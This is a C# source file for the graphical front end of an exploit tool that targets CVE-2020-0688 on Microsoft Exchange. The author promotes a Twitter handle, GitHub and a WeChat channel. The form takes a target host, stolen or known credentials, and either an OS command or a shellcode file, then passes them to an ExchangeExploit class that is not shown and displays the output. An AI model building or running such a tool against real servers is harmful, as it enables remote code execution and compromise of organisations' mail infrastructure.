using HandyControl.Controls;
using System;
using System.Windows;
using Microsoft.Win32;
using System.IO;

namespace CVE_2020_0688_GUI
{
    public partial class MainWindow : System.Windows.Window
    {
        private static string? ShellCodeFilePath = "";
        public MainWindow()
        {
            InitializeComponent();
            tbPersonalIntro.Text = "Twitter: @W01fh4cker\n\nGithub: https://github.com/W01fh4cker\n\n自创纯原创公众号：【追梦信安】，专注于发布技术文章，对技术有执着的追求和不屈的信仰，娱乐圈之流、投机倒把者勿扰。";
        }

        private void ClearButton_Click(object sender, RoutedEventArgs e)
        {
            ResultText.Clear();
            ShellCodeFilePath = "";
        }

        private void OpenFileButton_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
            openFileDialog.Filter = "Text files (*.bin)|*.bin|All files (*.*)|*.*";
            if (openFileDialog.ShowDialog() == true)
            {
                ShellCodeFilePath = openFileDialog.FileName;
                Growl.Success("已成功选择：" + ShellCodeFilePath); 
            }
        }

        private Boolean CheckBlank()
        {
            if (TargetUrl.Text != "" && TargetUsername.Text != "" && TargetPassword.Text != "")
                if(CommandToExecute.Text != "" || ShellCodeFilePath != "")
                    return true;
                else
                    return false;
            else
                return false;
        }

        private Boolean CheckModeOnly()
        {
            if(CommandToExecute.Text != "" && ShellCodeFilePath != "")
            {
                return false;
            }
            else { 
                return true; 
            }
        }

        private Boolean CheckUrlFormat(string TargetUrl)
        {
            if (TargetUrl.StartsWith("https://") || TargetUrl.StartsWith("http://"))
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        private void ExploitButton_Click(object sender, RoutedEventArgs e)
        {
            ResultText.Clear();
            if (CheckBlank())
            {
                if (!CheckModeOnly())
                {
                    Growl.Error("命令执行和shellcode加载只能二选一执行，请确保命令执行处的命令输入框为空！");
                }else if (CheckUrlFormat(TargetUrl.Text))
                {
                    Growl.Info("开始尝试利用");
                    if (checkIfFx48.IsChecked == true)
                    {
                        ExchangeExploit exchangeExp = new ExchangeExploit(TargetUrl.Text, TargetUsername.Text, TargetPassword.Text, "v48", CommandToExecute.Text, ShellCodeFilePath);
                        ResultText.AppendText(exchangeExp.ExchangeCmd() + "\n");
                        Growl.Success("执行成功！请查看下方的结果输出框。");
                    }
                    else
                    {
                        ExchangeExploit exchangeExp = new ExchangeExploit(TargetUrl.Text, TargetUsername.Text, TargetPassword.Text, "", CommandToExecute.Text, ShellCodeFilePath);
                        ResultText.AppendText(exchangeExp.ExchangeCmd() + "\n");
                        Growl.Success("执行成功！请查看下方的结果输出框。");
                    }
                }
                else
                {
                    Growl.Error("目标地址不要加上https://或者http://前缀！");
                }
            }
            else
            {
                Growl.Error("必填信息不能为空！");
            }
        }
    }
}